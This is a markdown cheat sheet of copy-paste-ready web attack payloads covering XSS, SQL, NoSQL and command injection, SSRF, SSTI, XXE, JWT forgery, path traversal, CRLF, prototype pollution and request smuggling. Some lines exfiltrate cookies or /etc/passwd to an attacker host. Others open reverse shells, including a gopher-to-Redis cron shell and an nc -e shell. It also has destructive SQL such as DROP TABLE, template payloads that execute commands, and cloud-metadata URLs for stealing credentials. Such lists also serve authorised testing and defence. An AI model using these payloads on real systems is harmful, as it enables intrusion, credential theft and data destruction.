# Payload Collections — Copy-Paste Ready

## XSS Payloads

### Basic
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<math><mtext><table><mglyph><svg><mtext><textarea><mi><svg onload=alert(1)>
```

### Filter Bypass
```
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<script>alert&lpar;1&rpar;</script>
<script>\u0061lert(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>window['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>this[`al${`ert`}`](1)</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">
<svg/onload=alert(1)>
<svg onload=alert&#40;1&#41;>
<svg onload=alert&#x28;1&#x29;>
<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
```

### No Parentheses
```
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<img src=x onerror=alert`1`>
<script>import('data:text/javascript,alert(1)')</script>
```

### No Script Tags
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio><source onerror=alert(1)>
<object data=javascript:alert(1)>
<isindex action=javascript:alert(1) type=image>
<form><button formaction=javascript:alert(1)>X</button>
<math><a xlink:href="javascript:alert(1)">click
```

### No Alert
```
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>
<script>document.write(1)</script>
<script>window.location='//attacker.com?c='+document.cookie</script>
<script>fetch('//attacker.com?c='+document.cookie)</script>
<script>navigator.sendBeacon('//attacker.com',document.cookie)</script>
```

### Polyglots
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0teleD%0teleN%0teleB//teleC/*&apos;%teleD{apos;}*/alert()//
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<img/src=`%00`onerror=this.onerror=confirm(1)>
```

### Markdown XSS
```
[clickme](javascript:alert(1))
[clickme](vbscript:alert(1))
![img](x)![img](x"onerror="alert(1))
[link](javascript:alert`1`)
```

### SVG XSS
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x to=1>
<svg><foreignObject><body onload=alert(1)>
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r="400"></circle></a></svg>
```

---

## SQL Injection Payloads

### Auth Bypass
```
' OR 1=1-- -
' OR 1=1#
' OR '1'='1
' OR ''='
admin'--
admin' #
admin'/*
' OR 1=1 LIMIT 1-- -
' OR 1=1 LIMIT 1#
1' ORDER BY 1-- -
") OR ("1"="1
') OR ('1'='1
' UNION SELECT 1,username,password FROM users-- -
```

### UNION Based
```
' ORDER BY 1-- -          (increment until error to find column count)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -  (identify which columns are displayed)
' UNION SELECT username,password,3 FROM users-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT GROUP_CONCAT(username,0x3a,password),2,3 FROM users-- -
```

### Error Based
```
# MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=1/(CASE WHEN (1=1) THEN 1 ELSE 0 END)-- -

# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)-- -
```

### Time Based Blind
```
# MySQL
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)-- -
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)-- -

# PostgreSQL
'; SELECT pg_sleep(5)-- -
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

# MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

# SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
```

### Stacked Queries
```
'; DROP TABLE users-- -
'; INSERT INTO users(username,password) VALUES('hacker','hacked')-- -
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
'; EXEC xp_cmdshell('whoami')-- -                    (MSSQL)
'; COPY (SELECT '') TO PROGRAM 'id'-- -              (PostgreSQL)
```

### WAF Bypass
```
# Space alternatives
'/**/OR/**/1=1-- -
'+OR+1=1-- -
'%09OR%091=1-- -     (tab)
'%0aOR%0a1=1-- -     (newline)
'%0dOR%0d1=1-- -     (carriage return)
'%0bOR%0b1=1-- -     (vertical tab)
'%a0OR%a01=1-- -     (non-breaking space)

# Case variation
' oR 1=1-- -
' Or 1=1-- -

# Encoding
%27%20OR%201%3D1--%20-
%2527%2520OR%25201%253D1--%2520-    (double encoding)

# Comment obfuscation
'/*!50000OR*/1=1-- -
'/*!OR*/1=1-- -

# Alternative keywords
' || 1=1-- -         (OR alternative)
' && 1=1-- -         (AND alternative)
' DIV 0-- -          (division)
' LIKE 1-- -
' RLIKE 1-- -
' REGEXP 1-- -
```

---

## SSRF Payloads

### Localhost Variations
```
http://127.0.0.1
http://localhost
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[::ffff:127.0.0.1]
http://0x7f000001
http://2130706433
http://017700000001
http://0177.0.0.1
http://127.0.0.1.nip.io
http://localtest.me
http://customer1.app.localhost
http://127.127.127.127
http://0x7f.0x0.0x0.0x1
```

### Cloud Metadata
```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS ECS
http://169.254.170.2/v2/credentials/GUID

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

### Protocol Payloads
```
# File read
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///home/user/.bash_history
file:///var/log/apache2/access.log

# Gopher (for internal service exploitation)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/9001 0>&1%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Dict (Redis, Memcached)
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats

# TFTP
tftp://attacker.com/evil

# FTP
ftp://attacker.com/evil
```

### URL Parsing Bypass
```
http://attacker.com@127.0.0.1/
http://127.0.0.1#@attacker.com
http://127.0.0.1%2523@attacker.com
http://attacker.com\@127.0.0.1
http://127.0.0.1:80\@attacker.com
http://127.0.0.1%00@attacker.com
http://attacker%2F%2F.com@127.0.0.1
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ               (unicode confusable)
http://127。0。0。1                    (fullwidth dot)
http://①②⑦.⓪.⓪.①
```

---

## Command Injection Payloads

### Basic
```
; id
| id
` id `
$(id)
& id
&& id
|| id
%0a id
%0d id
\n id
{id}
```

### Blind (Out-of-Band)
```
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id|base64)
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
| curl http://attacker.com -d @/etc/passwd
; dig $(cat /etc/hostname).attacker.com
```

### Filter Bypass
```
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat</etc/passwd
cat%09/etc/passwd        (tab)
cat%0a/etc/passwd        (newline)

# Keyword bypass
c''at /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
ca$()t /etc/passwd
ca$@t /etc/passwd
/???/c?t /???/p??s??     (glob)
$(printf '\x63\x61\x74') /etc/passwd
cat ${HOME:0:1}etc${HOME:0:1}passwd  (variable substring)

# Using env variables
echo ${PATH:0:1}          → /
echo ${LS_COLORS:10:1}    → varies
${HOME:0:1}bin${HOME:0:1}cat /etc/passwd

# Base64 bypass
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)

# Hex bypass
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# Rev bypass
echo 'dwssap/cte/ tac' | rev | bash

# Wildcard bypass
/???/c?t /???/p??s??
/???/n? -e /???/b??h attacker.com 4444
```

---

## SSTI Payloads

### Detection (Language-Agnostic)
```
{{7*7}}              → 49 (Jinja2, Twig, etc.)
${7*7}               → 49 (Freemarker, Velocity, Mako)
<%= 7*7 %>           → 49 (ERB)
#{7*7}               → 49 (Pug/Jade, Slim)
${{7*7}}             → 49 (some double-template engines)
{{7*'7'}}            → 7777777 (Jinja2 — string multiplication)
{{7*'7'}}            → 49 (Twig — arithmetic)
```

### Jinja2 (Python) — RCE
```
# Method Resolution Order traversal
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen (usually index ~400)
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}

# Using config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Bypass filters
{% set cmd = 'id' %}{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen(cmd).read()") }}{% endif %}{% endfor %}

# attr filter bypass
{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}
```

### Twig (PHP) — RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id']|map('system')}}
```

### ERB (Ruby) — RCE
```
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id')[0] %>
```

### Freemarker (Java) — RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
```

---

## XXE Payloads

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Blind XXE (OOB Data Exfiltration)
```xml
<!-- Attacker sends this -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %payload;
]>
<foo>&exfil;</foo>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

### XXE in File Uploads
```xml
<!-- SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- XLSX (xl/sharedStrings.xml inside zip) -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>&xxe;</t></si>
</sst>
```

### PHP Wrappers for XXE
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=">
```

---

## JWT Payloads

### None Algorithm
```json
// Header (base64url encoded)
{"alg":"none","typ":"JWT"}
// or
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

// Token format: header.payload. (empty signature, note trailing dot)
```

### Key Confusion (RS256 → HS256)
```python
import jwt
import hmac
import hashlib
import base64

# 1. Get the server's public key (from /.well-known/jwks.json, /api/keys, certificate)
public_key = open('public_key.pem').read()

# 2. Create token signed with HMAC using public key as secret
payload = {"sub": "admin", "role": "admin", "iat": 1234567890}
token = jwt.encode(payload, public_key, algorithm='HS256')
```

### JKU/X5U Injection
```json
// Header with attacker-controlled JKU
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
// Host your own JWKS with your key pair, sign token with your private key
```

---

## NoSQL Injection Payloads

### MongoDB Auth Bypass
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": [""]}, "password": {"$nin": [""]}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### MongoDB Data Extraction
```json
// Extract password character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

// Extract username
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

### URL Parameter Injection
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username=admin&password[$gt]=
username[$in][]=admin&username[$in][]=root&password[$ne]=
```

---

## Open Redirect Payloads

```
https://target.com/redirect?url=https://attacker.com
https://target.com/redirect?url=//attacker.com
https://target.com/redirect?url=\/\/attacker.com
https://target.com/redirect?url=https:attacker.com
https://target.com/redirect?url=/\attacker.com
https://target.com/redirect?url=/.attacker.com
https://target.com/redirect?url=attacker.com
https://target.com/redirect?url=%2F%2Fattacker.com
https://target.com/redirect?url=https://target.com@attacker.com
https://target.com/redirect?url=https://attacker.com%23.target.com
https://target.com/redirect?url=https://attacker.com%00.target.com
https://target.com/redirect?url=https://target.com.attacker.com
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
https://target.com/redirect?url=javascript:alert(1)
```

---

## Path Traversal Payloads

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd         (double encoding)
....//....//....//etc/passwd                (filter bypass)
..;/..;/..;/etc/passwd                      (Spring/Tomcat)
..%00/etc/passwd                            (null byte - old)
..%c0%af..%c0%af..%c0%afetc/passwd          (unicode encoding)
/var/www/../../etc/passwd
\..\..\..\..\etc\passwd                     (Windows-style)
..\/..\/..\/etc\/passwd                     (mixed separators)
```

---

## CORS Misconfiguration Test
```bash
# Reflected origin
curl -s -I -H "Origin: https://attacker.com" https://target.com/api/sensitive
# Check: Access-Control-Allow-Origin: https://attacker.com

# Null origin
curl -s -I -H "Origin: null" https://target.com/api/sensitive
# Check: Access-Control-Allow-Origin: null

# Subdomain wildcard
curl -s -I -H "Origin: https://evil.target.com" https://target.com/api/sensitive

# Prefix match
curl -s -I -H "Origin: https://target.com.attacker.com" https://target.com/api/sensitive

# With credentials
# Check: Access-Control-Allow-Credentials: true (this is the dangerous one)
```

---

## CRLF Injection Payloads
```
%0d%0aSet-Cookie:csrf=attacker
%0d%0aLocation:https://attacker.com
%0d%0a%0d%0a<script>alert(1)</script>
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
\r\nSet-Cookie:csrf=attacker
%E5%98%8A%E5%98%8DSet-Cookie:csrf=attacker    (UTF-8 encoding bypass)
```

---

## Prototype Pollution Payloads
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"polluted": "yes"}}
{"__proto__": {"status": 200}}
{"__proto__": {"json spaces": 10}}

// URL parameter form
?__proto__[isAdmin]=true
?__proto__.isAdmin=true
?constructor[prototype][isAdmin]=true
?constructor.prototype.isAdmin=true

// Nested
{"a": {"__proto__": {"b": true}}}
```

---

## HTTP Request Smuggling

### CL.TE
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
G
0


```

### TE.TE (Obfuscation)
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```
